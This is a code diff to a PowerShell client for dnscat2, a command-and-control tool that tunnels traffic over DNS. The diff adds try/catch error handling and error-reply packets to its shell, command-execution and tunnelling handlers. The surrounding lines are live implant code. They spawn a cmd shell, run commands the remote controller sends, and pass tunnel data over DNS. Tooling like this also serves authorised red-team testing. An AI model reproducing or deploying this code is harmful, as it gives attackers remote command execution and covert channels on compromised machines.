@@ -346,23 +346,39 @@ function Update-Dnscat2CommandSession ($Session) {
             }
             "0001" # COMMAND_SHELL
             {
-                $NewSessionName = $Session.CommandFields
-                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" "cmd"
-                $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
-                $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
-                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0001" + $NewSession.SessionId)
-                $Session["DriverDataQueue"] += $DriverData
+                try {
+                    $NewSessionName = $Session.CommandFields
+                    $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" "cmd"
+                    $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
+                    $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0001" + $NewSession.SessionId)
+                    $Session["DriverDataQueue"] += $DriverData
+                } catch {
+                    $ErrorCode = $CommandId
+                    $Reason = (Convert-StringToHex "COMMAND_SHELL Failed!") + "00"
+                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
+                    $Session["DriverDataQueue"] += $DriverData
+                }
                 return $Session
             }
             "0002" # COMMAND_EXEC
             {
-                $NewSessionName = $Session.CommandFields.split("00")[0]
-                $NewSessionCommand = Convert-HexToString $Session.CommandFields.split("00")[2]
-                $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
-                $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
-                $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
-                $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
-                $Session["DriverDataQueue"] += $DriverData
+                try {
+                    $NewSessionName = $Session.CommandFields.split("00")[0]
+                    $NewSessionCommand = Convert-HexToString $Session.CommandFields.split("00")[2]
+                    $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
+                    $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
+                    $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
+                    $Session["DriverDataQueue"] += $DriverData
+                } catch {
+                    $ErrorCode = $CommandId
+                    $Reason = (Convert-StringToHex "COMMAND_EXEC Failed!") + "00"
+                    $PacketLengthField = ([Convert]::ToString((4 + 2 + $Reason.Length/2),16)).PadLeft(8, '0')
+                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "FFFF" + $ErrorCode + $Reason)
+                    $Session["DriverDataQueue"] += $DriverData
+                }
                 return $Session
             }
             "0003" # COMMAND_DOWNLOAD
@@ -439,14 +455,18 @@ function Update-Dnscat2CommandSession ($Session) {
             }
             "1001" # TUNNEL_DATA
             {
-                $TunnelId = $Session["CommandFields"].Substring(0, 8)
-                $Data = $Session["CommandFields"].Substring(8)                
-                $Session = Send-ToDnscat2Tunnel $Session $TunnelId $Data
+                try {
+                    $TunnelId = $Session["CommandFields"].Substring(0, 8)
+                    $Data = $Session["CommandFields"].Substring(8)                
+                    $Session = Send-ToDnscat2Tunnel $Session $TunnelId $Data
+                } catch { }
             }
             "1002" # TUNNEL_CLOSE
             {
-                $TunnelId = $Session["CommandFields"]
-                $Session = Close-Dnscat2Tunnel $Session $TunnelId
+                try {
+                    $TunnelId = $Session["CommandFields"]
+                    $Session = Close-Dnscat2Tunnel $Session $TunnelId
+                } catch { }
             }
         }
     }
